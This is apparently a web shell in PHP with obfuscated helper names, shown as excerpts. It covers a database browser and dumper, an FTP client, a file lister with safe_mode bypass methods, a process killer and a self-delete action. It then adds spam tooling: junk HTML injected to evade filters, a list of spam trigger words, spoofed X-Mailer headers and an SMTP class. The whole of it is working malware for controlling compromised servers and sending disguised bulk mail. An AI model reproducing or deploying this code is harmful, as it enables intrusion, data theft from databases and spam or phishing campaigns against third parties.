                            ...
                            if ($sql->select_db()) {
                                ...
                                if ($sql->get_result()) $tables = $sql->num_rows;
                                $sql->query("SELECT round(data_length + index_length) FROM information_schema.TABLES WHERE table_schema = \"" . $k . "\";");
                                if ($sql->get_result()) $size = @implode('', $sql->rows[0]);
                            }
                            $print_arr[] = [$k, $size, $tables];
                            $total_tables += $tables;
                            $total_size += $size;
                        }
                        $sql->base = $def_db;
                    ...
                    if (@count($print_arr) > 0) {
                        ...
                        foreach ($print_arr as $ar) {
                            echo z7i(z9j(z5c(["act" => "sql", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "db_act" => "select", "d", "sql_db" => $ar[0]], z8v($ar[0], "11")), "14", "2") . z9j(z7c($ar[1]), "14") . z9j($ar[2], "14") . z9j("<nobr>" . z5c(["act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "sql_db" => $ar[0]], z4a("db_act", $db_actions, "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "38"), ($count % 2 ? '0' : '1'));
                            $count++;
                        }
    ...
    if (!$hideconnect) {
        ...
        if (!@isset($q_sql_filename)) $q_sql_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".sql";
        $available_arr = [];
        if ($bmysql) $available_arr["MySQL"] = "MySQL";
        if ($bmssql) $available_arr["MSSQL"] = "MSSQL";
        if ($bpostgres) $available_arr["PostgreSQL"] = "PostgreSQL";
        ...
        echo z9m('2') . z5c(["act" => "sql", "d"], z5n() . z7i(z7e(z8e(z9s("452"))) . z7l(z5u("sql_server", "127.0.0.1", "4") . ":" . z5u("sql_port", "3306", "1")) . z7e(z8e(z9s("453"))) . z7l(z5u("sql_user", "root", "4")) . z7e(z8e(z9s("454"))) . z7l(z5u("sql_pass", "", "4")) . z7e(z8e(z9s("455"))) . z7l(z5u("sql_db", "", "4")) . z7e(z8e(z9s("456"))) . z7l(z4a("sql_engine", ["MySQL" => "MySQL"], "4", 1) . z8v(z9s("457"), "7")))) . z10w();
        echo z6d();
        echo z2b([z9s("410"), z9s("420")], '46');
        echo z9m('2') . z9f(z9j(z5c(["act" => "sql", "d", "q_sql_action" => "dump"], z9m() . z5n() . z7i(z5t(z9s("411")) . z9j(z4a("q_sql_engine", $available_arr, "4", 1))) . z7i(z5t(z9s("412")) . z9j(z5u("q_sql_server", "127.0.0.1", '4') . ":" . z5u("q_sql_port", "3306", "1"))) . z7i(z5t(z9s("413")) . z9j(z5u("q_sql_user", "root", "4") . ":" . z5u("q_sql_pass", "", "4"))) . z7i(z5t(z9s("414")) . z9j(z5u("q_sql_db", "mysql", "4") . "." . z5u("q_sql_table", "user", "4"))) . z7i(z5t(z9s("415")) . z9j(z5u("q_sql_filename", $q_sql_filename, "8"))) . z7i(z5t(z9c()) . z9j(z5y("q_sql_download", z9s("416"), "q_sql_download"))) . z7i(z5t(z9c()) . z9j(z5y("q_sql_save2file", z9s("417"), "q_sql_save2file"))) . z7i(z5t(z9c()) . z9j(z8v(z9s("418"), "7"))) . z5n() . z10w()), '', '4') . z9j(z5c(["act" => "sql", "d", "q_sql_action" => "query"], z9m() . z5n() . z7i(z5t(z9s("411")) . z9j(z4a("q_sql_engine", $available_arr, "4", 1))) . z7i(z5t(z9s("412")) . z9j(z5u("q_sql_server", "127.0.0.1", "4") . ":" . z5u("q_sql_port", "3306", "1"))) . z7i(z5t(z9s("413")) . z9j(z5u("q_sql_user", "root", "4") . ":" . z5u("q_sql_pass", "", "4"))) . z7i(z5t(z9s("421")) . z9j(z5u("q_sql_db", "mysql", "4"))) . z9f(z5t(z9s("370")) . z9j(z5w("q_sql_query", "4") . @htmlspecialchars($q_sql_query) . z5q())) . z7i(z5t(z9c()) . z9j(z8v(z9s("422"), "7"))) . z5n() . z10w()), '', "46")) . z10w();
        if (@isset($q_sql_action) && $q_sql_action == "query") {
            ...
            if (!$sql->connect()) $q_sql_connect_error = z2b(z9s("419")); else {
                if (!empty($sql->base) && !$sql->select_db()) $q_sql_connect_error = z2b(z9s("447")); else {
                    foreach ($querys as $num => $query) {
                        if (@strlen($query) > 5) {
                            $q_sql_result .= z2b(z9s("423", [$num, @htmlspecialchars($query, ENT_QUOTES)]));
        ...
        if (@isset($q_sql_action) && $q_sql_action == "dump") {
            ...
            if (@isset($q_sql_save2file) && $q_sql_save2file == "1" && @isset($q_sql_filename) && !@empty($q_sql_filename)) {
                if (z4q($q_sql_filename)) @unlink($q_sql_filename);
...
if ($act == "selfremove") {
    if (@isset($dconfirm) && $dconfirm) {
        if ($saddr != "127.0.0.1") echo z2b((@unlink(__FILE__) ? z9s("462") : z9s("463", __FILE__)));
    } else {
        echo z2b(z9s("460"));
        echo z6d() . z10e(z7i(z6x(z8e(z9s("461")) . z5c(["act" => "selfremove", "d", "dconfirm" => "1"], z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2") . z6d();
    }
}
if ($act == 'ftp') {
    $a_transfer = ["FTP_BINARY" => "FTP_BINARY", "FTP_ASCII" => "FTP_ASCII"];
    $hmsg = '';
    $hideconnect = 0;
    $jsid = 0;
    if (@isset($ftp_server) && !@isset($ftp_passive)) $ftp_passive = 0;
    if (!@isset($ftp_server) && !@isset($ftp_passive)) $ftp_passive = "1";
    ...
    if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@empty($ftp_password) && !@isset($ftp_quickaction)) {
        ...
        if ($ftp->loggedOn) {
            ...
            if (@isset($rd)) $ftp_current_dir = z1a($ftp_current_dir . $rd);
            ...
            $hideconnect = 1;
            $hmsg = z5c(["act" => "ftp", "d", "ft" => "logoff"], z8v(z9s("196"), "1"));
        } else {
            $hmsg = z9s("191");
        }
    }
    if (!@isset($ftp_server) || @empty($ftp_server)) $ftp_server = "127.0.0.1";
    if (!@isset($ftp_port) || @empty($ftp_port)) $ftp_port = "21";
    if (!@isset($ftp_username) || @empty($ftp_username)) $ftp_username = "anonymous";
    if (!@isset($ftp_password) || @empty($ftp_password)) $ftp_password = "anonymous@ftp.com";
    if (!@isset($ftp_localfile) || @empty($ftp_localfile)) $ftp_localfile = $d;
    if (!@isset($ftp_remotefile) || @empty($ftp_remotefile)) $ftp_remotefile = "/ftp-dir/somefile.txt";
    if ($hideconnect) {
        ...
        $frml = z9s("194") . z9c() . z5c(['act' => 'ftp', 'd', 'lmkdir' => '1'], z6i('ldir', '', '2') . z8v(z9s("195"), '7'));
        $frmf = z9s("194") . z9c() . z5c(['act' => 'ftp', 'd', 'fmkdir' => '1'], z6i('fdir', '', '2') . z8v(z9s("195"), '7'));
        echo z2b([z10e(z7i(z7l(z9s("192")) . z7e($frml)), '2'), z10e(z7i(z7l(z9s("193") . z9c() . $hmsg) . z7e($frmf)), '2')], '4');
            ...
            foreach ($listl as $lf) {
                ...
                if ($fn != '.' && $fn != '..') {
                    if (z4j($lf)) {
                        ...
                        $lsl["f"][] = [$lf, (@filesize($lf) !== false ? @filesize($lf) : 'FILE')];
                    }
                }
            }
        }
        ...
        $list_l[] = [$d . '..', 'LINK'];
        $list_f[] = ['..', 'LINK'];
        foreach ($lsl["d"] as $lf) $list_l[] = $lf;
        foreach ($lsl["l"] as $lf) $list_l[] = $lf;
        foreach ($lsl["f"] as $lf) $list_l[] = $lf;
        foreach ($lsf["d"] as $rf) $list_f[] = $rf;
        foreach ($lsf["l"] as $rf) $list_f[] = $rf;
        foreach ($lsf["f"] as $rf) $list_f[] = $rf;
        $cl = @count($list_l);
        $cf = @count($list_f);
        ...
        echo z7i(z7l(z5c(['act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '0' ? '0' . ($pflsort[1] == "a" ? "d" : "a") : '0' . $pflsort[1])], z8v(z9s("57") . ($pflsort[0] == '0' ? ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') . z7e(z5c(['act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '1' ? '1' . ($pflsort[1] == "a" ? "d" : "a") : '1' . $pflsort[1])], z8v(z9s("58") . ($pflsort[0] == '1' ? ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7l(z9s("62"), '8', '3'));
        for ($i = 0; $i < $cl; $i++) {
            $disp = z2h($list_l[$i][0]);
            if ((!@is_numeric($list_l[$i][1]) && $list_l[$i][1] == 'DIR') || $disp == '..') {
                $o = z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd' => $list_l[$i][0]], z8n('small_dir', '', '9') . z8v(z8f($disp, 40), '10', z3c($disp, 'd')));
            } else {
                $ext = z2h($list_l[$i][0], '.');
                $o = z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'upload', 'lt' => $list_l[$i][0]], z8n($ext, '', '9') . z8v(z8f($disp, 40), '11', z3c($disp, 'f')));
            }
        ...
        echo z7i(z7l(z5c(['act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '0' ? '0' . ($pffsort[1] == "a" ? "d" : "a") : '0' . $pffsort[1])], z8v(z9s("57") . ($pffsort[0] == '0' ? ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') . z7e(z5c(['act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '1' ? '1' . ($pffsort[1] == "a" ? "d" : "a") : '1' . $pffsort[1])], z8v(z9s("58") . ($pffsort[0] == '1' ? ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7l(z9s("62"), '8', '3'));
        for ($i = 0; $i < $cf; $i++) {
            $disp = z2h($list_f[$i][0]);
            if ((!@is_numeric($list_f[$i][1]) && $list_f[$i][1] == "DIR") || $disp == '..') {
                $o = z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $list_f[$i][0]], z8n('small_dir', '', '9') . z8v(z8f($disp, 40), '10', z3c($disp, 'd')));
            } else {
                $ext = z2h($list_f[$i][0], '.');
                $o = z5c(['act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'download', 'rt' => $list_f[$i][0]], z8n($ext, '', '9') . z8v(z8f($disp, 40), '11', z3c($disp, 'f')));
            }
        ...
        echo z9m('2') . z7p() . z7k('', '4') . z0p('idloc', 'ltall', z9b('act') . z9b('flsort') . z9b('ffsort') . z9b('d') . z9b('ftpmloc', '1'), ['' => z9s("66"), 'upload' => z9s("197"), 'delete' => z9s("199")]) . z7g() . z7k('', '4') . z0p('idftp', 'rtall', z9b('act') . z9b('flsort') . z9b('ffsort') . z9b('d') . z9b('ftpmrem', '1'), ['' => z9s("66"), 'download' => z9s("198"), 'delete' => z9s("199")]) . z7g() . z7u() . z10w();
    } else {
        echo z2b(z9s("185") . z9c() . ($hmsg != '' ? ' : ' . $hmsg : ''));
        echo z6d() . z10e(z7i(z5c(["act" => "ftp", "d"], z6x(z8e(z9s("186")) . z6i("ftp_server", $ftp_server, '5') . z6i("ftp_port", $ftp_port, '6')) . z6x(z8e(z9s("187")) . z6i("ftp_username", $ftp_username, '5')) . z6x(z8e(z9s("188")) . z6i("ftp_password", $ftp_password, '5') . z8v(z9s("189"), '7') . ' ' . z5y("ftp_passive1", z9s("190"), "ftp_passive")))), '2') . z6d();
        $dmsg = $umsg = '';
        if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@empty($ftp_password) && @isset($ftp_quickaction)) {
            $ftp = new ftp($ftp_server, $ftp_port, $ftp_username, $ftp_password, $ftp_passive);
            if ($ftp->loggedOn) {
        ...
        echo z2b([z9s("200") . z9c() . ($dmsg != '' ? " : " . $dmsg : ''), z9s("201") . z9c() . ($umsg != '' ? " : " . $umsg : '')], '46');
        echo z10e(z9f(z9j(z5c(['act' => 'ftp', 'ftp_quickaction' => 'download', 'd'], z10e(z5n() . z7i(z5t(z9s("202")) . z9j(z6i('ftp_server', $ftp_server, '2') . z6i('ftp_port', $ftp_port, '6'))) . z7i(z5t(z9s("203")) . z9j(z6i('ftp_username', $ftp_username, '4') . z6i('ftp_password', $ftp_password, '5'))) . z7i(z5t(z9s("204")) . z9j(z6i('ftp_remotefile', $ftp_remotefile, '0'))) . z7i(z5t(z9s("205")) . z9j(z6i('ftp_localfile', $ftp_localfile, '0'))) . z7i(z5t('') . z9j(z8v(z9s("207"), '7') . z5y("ftp_passive2", z9s("190"), "ftp_passive"))) . z5n())), '', '4') . z9j(z5c(['act' => 'ftp', 'ftp_quickaction' => 'upload', 'd'], z10e(z5n() . z7i(z5t(z9s("202")) . z9j(z6i('ftp_server', $ftp_server, '2') . z6i('ftp_port', $ftp_port, '6'))) . z7i(z5t(z9s("203")) . z9j(z6i('ftp_username', $ftp_username, '4') . z6i('ftp_password', $ftp_password, '5'))) . z7i(z5t(z9s("205")) . z9j(z6i('ftp_localfile', $ftp_localfile, '0'))) . z7i(z5t(z9s("204")) . z9j(z6i('ftp_remotefile', $ftp_remotefile, '0'))) . z7i(z5t('') . z9j(z8v(z9s("206"), '7') . z5y("ftp_passive3", z9s("190"), "ftp_passive"))) . z5n())), '', '46')), '2');
    }
}
if ($act == 'ls') {
    if (!@isset($sort)) {
    ...
    $_SESSION['sort'] = $sort;
    if (!@isset($ftarget)) $ftarget = '';
    if (!@isset($fullpath)) $fullpath = 0;
    if (!@isset($with_ls)) $with_ls = 0;
    ...
    $ugstat = 0;
    $jsid = 0;
    if (z7r('posix_getpwuid') && z7r('posix_getgrgid') && z7r('fileowner') && z7r('filegroup')) $ugstat = 1;
    ...
    if (@count($list) > 0) {
        ...
        foreach ($list as $v) {
            ...
            if (@isset($filter) && !z1e($v, $filter, $t)) continue;
            if ($with_ls) {
                $inf[$v] = z4d($v, $t);
            } else {
        ...
        if (!@isset($nohead) || !$nohead) {
            for ($i = 0; $i < @count($row) - 1; $i++) {
                $row[$i] = z5c(['act', 'd', 'filter', 'sort' => ($i == $psort[0] ? $i . ($psort[1] == "a" ? "d" : "a") : $i . $psort[1])], z8v($row[$i] . ($i == $psort[0] ? ' ' . ($psort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3', ($i == "1" ? ' style="text-align: right;"' : '')));
            }
        }
        $v = $psort[0];
        @usort($obj["d"], "z3i");
        ...
        foreach ($obj as $a) {
            if (@is_array($a) && @count($a) >= 6) {
                ...
                $row = [];
                if ($o == ".") {
                    $row[] = z5c(['act' => 'ls', 'd' => $v], z8n('small_dir', '', '9') . z8v($disp, '10'), $ftarget);
                    $row[] = "LINK";
                } elseif ($o == "..") {
                    $row[] = z5c(['act' => 'ls', 'd' => $v], z8n('small_dir', '', '9') . z8v($disp, '10'), $ftarget);
                    $row[] = "LINK";
                    ...
                    if ($t2 == 'l') {
                        if (@readlink($v)) $disp .= " => " . @readlink($v);
                        $type = "LINK";
                        $row[] = z5c(['act' => 'ls', 'd' => $v], z8n('small_dir', '', '9') . z8v($disp, '10', z3c($o, 'd')), $ftarget);
                    } else {
                        $type = "DIR";
                        $row[] = z5c(['act' => 'ls', 'd' => $v], z8n('small_dir', '', '9') . z8v($disp, '10', z3c($o, 'd')), $ftarget);
                    }
                    ...
                    $row[] = z5c(['act' => 'f', 'd' => $dir, 'f' => $o], z8n($ext, '', '9', (($t == 'e' || $t2 == 'e') ? '1' : '')) . z8v($disp, '11', z3c($o, 'f')), $ftarget);
        ...
        if (@count($table) > 0) {
            ...
            if (@isset($use_buffer) && $use_buffer && (!@isset($nolsmenu) || !$nolsmenu)) {
                ...
                if ($ucopy && $ucut) $arr_select["bunsetall"] = z9s("71");
            }
            $arr_select["delete"] = z9s("72");
            echo z0p('ls', 'lsall', z9b('act') . z9b('d'), $arr_select);
        }
    } else {
        if (z7r('imap_open') && z7r('imap_list') && @version_compare(@phpversion(), "5.2.0") <= 0) $sls_arr["imap"] = "imap_list (safe_mode / PHP <= 5.1.2)";
        if (z7r('glob')) $sls_arr["glob"] = "glob (PHP <= 5.2.x + some others)";
        if (z7r('realpath')) $sls_arr["realpath"] = "realpath (PHP <= 5.2.4 + some others)";
        ...
        if (@count($sls_arr) > 0) {
            ...
            echo z5q();
            echo z7g() . z7u() . z10w();
            echo z10e(z7i(z6x(z5x("left", "3") . z5c(["act", "submit1" => "1"], z10e(z7i(z9j(z8e(z9s("126")) . z5u("d", $d, "0", "", "9") . z4a("listdir_func", $sls_arr, "5", 1) . z8v(z9s("127"), "7"))), "2")) . z5j())), "2");
            echo z6d();
        } else {
            echo z2b(z9s("464", $d));
        }
...
if ($act == 'processes') {
    if (!@isset($sortp)) $sortp = ($nix ? '1a' : '0a');
    $header = '';
    if ($nix) {
        ...
        if (@isset($pid) && $pid) {
            ...
            $header = " : " . z9s("349", [$sig, $pid]) . (@posix_kill($pid, $sig) ? z9s("350") : z9s("351"));
        }
    } else {
        $h = 'tasklist';
    }
    ...
    if ($r) {
        ...
        if ($nix) {
            ...
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5c(['act', 'd', 'pfilter', 'sortp' => $i . $ppsort[1]], z8v($head[$i], '3'));
                } else {
                    $head[$i] = z5c(['act', 'd', 'pfilter', 'sortp' => $ppsort[0] . ($ppsort[1] == 'a' ? 'd' : 'a')], z8v($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' : '&darr;'), '3'));
                }
            }
            $head[] = z9s("62");
            $prcs = [];
            ...
            foreach ($stack as $line) {
                if (!@empty($line)) {
                    ...
                    if (($bool && $pfilter == $line[0]) || !$bool) {
                        $line[0] = z5c(['act' => 'processes', 'd', 'sortp', 'pfilter' => (($bool && $pfilter == $line[0]) ? '---' : $line[0])], z8v($line[0], '1', (($line[0] == $cuser) ? ' style="color:' . z9w("okcolor") . ';"' : '')));
                        $line[10] = @join(" ", @array_slice($line, 10));
                        $line = @array_slice($line, 0, 11);
                        $line[] = z5c(['act' => 'processes', 'd', 'sortp', 'pfilter', 'pid' => $line[1], 'sig' => '9'], z8v(z9s("392"), "7"));
                        $prcs[] = $line;
                    }
                }
            }
            ...
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5c(['act', 'd', 'sortp' => $i . $ppsort[1]], z8v($head[$i], '3'));
                } else {
                    $head[$i] = z5c(['act', 'd', 'sortp' => $ppsort[0] . ($ppsort[1] == 'a' ? 'd' : 'a')], z8v($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' : '&darr;'), '3'));
                }
            }
            $prcs = [];
            foreach ($stack as $line) {
...
z3x();
function r_random_domain()
{
    $array_email_domains = ["aol.com", "att.net", "bellsouth.net", "comcast.net", "earthlink.net", "email.com", "fastmail.fm", "gmail.com", "googlemail.com", "hotmail.com", "hushmail.com", "inbox.com", "incredimail.com", "juno.com", "live.com", "lycos.com", "mail.com", "mindspring.com", "msn.com", "pacbell.com", "post.com", "prodigy.net", "rocketmail.com", "sbcglobal.net", "usa.com", "verizon.net", "walla.com", "yahoo.com", "ymail.com"];
    return strtolower($array_email_domains[(r_rand(0, count($array_email_domains) - 1))]);
}

function get_domain_shell($url)
{
    $parse = parse_url($url);
    $shell_domain = str_replace(['www.', '\r', '\n'], '', $parse['host']);
    return $shell_domain;
}

function get_domain_email($data)
{
    $data = explode('@', $data);
    return $data[1];
}

function r_add_junk_html($message, $junklevel = 10)
{
    $notags = strip_tags($message);
    $msglength = strlen($notags);
    $junklength = ceil(($msglength / 100) * $junklevel);
    $currentlength = 0;
    $array_tags = r_split_by_tags($message);
    if (count($array_tags) == 1) return $message;
    $m_arr = [];
    foreach ($array_tags as $tag) {
        $m_arr[] = [$tag, ''];
    }
    if ($currentlength < $junklength) {
        while ($currentlength < $junklength) {
            $needlength = ($junklength - $currentlength);
            if ($currentlength < $junklength) {
                $random_tag = r_rand(1, count($m_arr) - 1);
                if (empty($m_arr[$random_tag][1])) {
                    $string = r_ucfirst_all(r_random_value('word2', 3, 8));
                } else {
                    $bool_lower = r_rand(0, 3);
                    $string = r_random_value('word2', 3, 8);
                    $string = (($bool_lower) ? strtolower($string) : r_ucfirst_all($string));
                }
                $strlen = strlen($string) + 1;
                $currentlength += $strlen;
                $m_arr[$random_tag][1] = trim($m_arr[$random_tag][1] . " " . $string);
            }
        }
    }
    $message = '';
    foreach ($m_arr as $array) {
        if (!empty($array[1])) {
            $message .= '<span id="' . $array[1] . '"></span>';
        }
        $message .= $array[0];
    }
    return $message;
...
function r_add_junk_comments($message, $junklevel = 10)
{
    $notags = strip_tags($message);
    $msglength = strlen($notags);
    $junklength = ceil(($msglength / 100) * $junklevel);
...
function r_split_by_tags($html)
{
    $parts = explode('<', $html);
    if (count($parts) < 1) return [$html];
    ...
    foreach ($parts as $part) {
        if (preg_match('/^<(table|tr|td|div|p|a|span)/i', $part)) {
            if (!empty($chunk)) $array[] = $chunk;
            $chunk = $part;
        } else {
            $chunk .= $part;
        }
...
function r_rand($min, $max)
{
    ...
    if (function_exists('srand')) {
        srand((double)microtime() * 1000000);
    }
    return rand($min, $max);
}

function r_ucfirst_all($string)
{
...
function r_random_value($type, $min, $max)
{
    $lower = $upper = $ucfirst = 0;
    if ($type == 'number_value') {
        return r_rand((int)$min, (int)$max);
    } elseif ($type == "word2") {
        return r_rand_word(r_rand((int)$min, (int)$max));
    }
    if (strpos($type, "_lower") !== false) {
        $type = str_replace("_lower", "", $type);
        $lower++;
    }
    if (strpos($type, "_upper") !== false) {
        $type = str_replace("_upper", "", $type);
        $upper++;
    }
    if (strpos($type, "_ucfirst") !== false) {
        $type = str_replace("_ucfirst", "", $type);
        $ucfirst++;
    }
    if ($type == "word" || $type == "string") {
        $chars = (($type == "word") ? r_str_split('qwertyuiopasdfghjklzxcvbnm') : r_str_split('qwertyuiopasdfghjklzxcvbnm1234567890'));
        shuffle($chars);
    }
    ...
    if ($max < 1) return '';
    $return = '';
    $length = r_rand($min, $max);
    for ($i = 0; $i < $length; $i++) {
        if ($type == "number") {
            $return .= (empty($return) ? r_rand(1, 9) : r_rand(0, 9));
        } elseif ($type == "word" || $type == "string") {
            $bool = r_rand(0, 1);
            $char = $chars[(r_rand(0, count($chars) - 1))];
            $return .= (($bool) ? strtoupper($char) : $char);
        }
    }
    if ($lower) return strtolower($return);
    if ($upper) return strtoupper($return);
    if ($ucfirst) return r_ucfirst_all($return);
    return $return;
}

function r_str_split($string, $split_length = 1)
{
...
function r_rand_word($length = 5)
{
    $vowels = ["a", "e", "i", "o", "u"];
    $complex_vowels = ["ai", "au", "ea", "ee", "ie", "oo", "oa", "oi", "ou", "ua"];
    $consonants = ["b", "c", "d", "g", "l", "m", "n", "p", "s", "t", "w", "z", "v"];
    $start_consonants = ["bl", "br", "ch", "cl", "cr", "dr", "f", "fl", "fr", "gl", "gr", "h", "j", "k", "kl", "kn", "kr", "pe", "ph", "pl", "pr", "qu", "rh", "sc", "sh", "sk", "sl", "sm", "sn", "sp", "st", "str", "th", "tr", "tw", "v", "wh", "wr", "y"];
    $complex_consonants = ["bl", "br", "ch", "cl", "cr", "dr", "f", "fl", "fr", "gl", "gr", "h", "j", "k", "kl", "kn", "kr", "ph", "pl", "pr", "qu", "rh", "sc", "sh", "sk", "sl", "sm", "sn", "sp", "st", "str", "th", "tr", "tw", "v", "wh", "wr", "y"];
    $endings_consonants = ["ch", "ck", "fe", "ff", "ft", "ke", "ld", "ll", "nd", "ng", "nk", "nt", "mg", "mp", "re", "rp", "rt", "sh", "sk", "sp", "ss", "st", "th",];
    $word = '';
    $done = false;
    $const_or_vowel = r_rand(1, 2);
    $used_complex_vowels = $used_complex_consonants = 0;
    while (!$done) {
        switch ($const_or_vowel) {
            case 1:
                $use_array = r_rand(0, 1);
                if (empty($word)) {
                    $word .= $start_consonants[(r_rand(0, count($start_consonants) - 1))];
                } else {
                    if ($use_array == 0 || $used_complex_consonants) {
                        $word .= $consonants[(r_rand(0, count($consonants) - 1))];
                    } elseif ($use_array == 1 && !$used_complex_consonants) {
                        $word .= $complex_consonants[(r_rand(0, count($complex_consonants) - 1))];
                        $used_complex_consonants++;
                    }
                }
                $const_or_vowel = 2;
                break;
            case 2:
                $use_array = r_rand(0, 1);
                if (empty($word)) {
                    $word .= $vowels[(r_rand(0, count($vowels) - 1))];
                } else {
                    if ($use_array == 0 || $used_complex_vowels) {
                        $word .= $vowels[(r_rand(0, count($vowels) - 1))];
                    } elseif ($use_array == 1 && !$used_complex_vowels) {
                        $word .= $complex_vowels[(r_rand(0, count($complex_vowels) - 1))];
                        $used_complex_vowels++;
                    }
                }
                $const_or_vowel = 1;
    ...
    if (preg_match('/(' . implode('|', $complex_consonants) . '|q' . ')$/', $word, $match)) {
        if (strlen($match[1]) == 1) {
            $word = substr($word, 0, -1) . $vowels[(r_rand(0, count($vowels) - 1))];
        } else {
            $word = substr($word, 0, -2) . $endings_consonants[(r_rand(0, count($endings_consonants) - 1))];
        }
    }
    if (r_bad_word($word)) return r_rand_word($length);
    return $word;
}

function r_bad_word($word)
{
    $word = strtolower($word);
    $bad_words = ["allah", "anal", "anus", "arse", "ass", "bitch", "bloody", "bollock", "boob", "cock", "cunt", "crap", "cum", "damn", "dick", "fag", "fart", "fuck", "gimp", "hell", "homo", "nigga", "nigger", "penis", "piss", "poo", "pussy", "rape", "rapist", "sex", "shit", "slut", "spastic", "tits", "twat", "vag", "vagina", "vomit", "wank", "whore", "spam", "scam", "money", "viagra", "cialis", "free", "guarantee", "urgent", "bank", "credit", "card", "mortage", "loan", "break", "pay", "payment", "fee", "fees", "low", "need"];
    return in_array($word, $bad_words);
}

function r_xmailer($rand = false)
{
    $applemail = ["X-Mailer: Apple Mail (2.1486)", "X-Mailer: Apple Mail (2.1278)", "X-Mailer: Apple Mail (2.1257)", "X-Mailer: Apple Mail (2.1251.1)", "X-Mailer: Apple Mail (2.1084)", "X-Mailer: Apple Mail (2.1082)", "X-Mailer: Apple Mail (2.1081)", "X-Mailer: Apple Mail (2.1078)", "X-Mailer: Apple Mail (2.1077)", "X-Mailer: Apple Mail (2.1075.2)"];
    $applemobile = ["X-Mailer: iPad Mail (7B367)", "X-Mailer: iPad Mail (7B500)", "X-Mailer: iPhone Mail (7C144)", "X-Mailer: iPhone Mail (7D11)", "X-Mailer: iPhone Mail (7E18)", "X-Mailer: iPhone Mail (8A293)", "X-Mailer: iPhone Mail (8A306)", "X-Mailer: iPhone Mail (8B117)", "X-Mailer: iPhone Mail (8C148)", "X-Mailer: iPhone Mail (8F190)", "X-Mailer: iPhone Mail (8G4)"];
    $microsoft = ["X-Mailer: Microsoft Office Outlook 11", "X-Mailer: Microsoft Office Outlook 12.0", "X-Mailer: Microsoft Outlook 14.0"];
    $squirrelmail = ["X-Mailer: SquirrelMail/1.4.3a", "X-Mailer: SquirrelMail/1.4.3a-1.EL4", "X-Mailer: SquirrelMail/1.4.3a-2.EL4", "X-Mailer: SquirrelMail/1.4.3a-3.EL4", "X-Mailer: SquirrelMail/1.4.3a-4.EL4", "X-Mailer: SquirrelMail/1.4.3a-5.EL4", "X-Mailer: SquirrelMail/1.4.3a-6.EL4", "X-Mailer: SquirrelMail/1.4.3a-7.EL4", "X-Mailer: SquirrelMail/1.4.3a-8.EL4", "X-Mailer: SquirrelMail/1.4.3a-9.EL4", "X-Mailer: SquirrelMail/1.4.3a-10.EL4", "X-Mailer: SquirrelMail/1.4.3a-11.EL4", "X-Mailer: SquirrelMail/1.4.3a-12.EL4"];
    if ($rand) {
        if ($rand == "2") {
            $array = array_merge($applemail, $applemobile);
        } elseif ($rand == "3") {
            $array = $applemail;
        } elseif ($rand == "4") {
            $array = $applemobile;
            ...
            $array = array_merge($applemail, $applemobile, $microsoft, $squirrelmail);
        }
        return $array[rand(0, count($array) - 1)];
    }
    return array_merge($applemail, $applemobile, $microsoft, $squirrelmail);
}
...
class SMTP
{
    ...
    protected $smtp_transaction_id_patterns = ['exim' => '/[0-9]{3} OK id=(.*)/', 'sendmail' => '/[0-9]{3} 2.0.0 (.*) Message/', 'postfix' => '/[0-9]{3} 2.0.0 Ok: queued as (.*)/'];
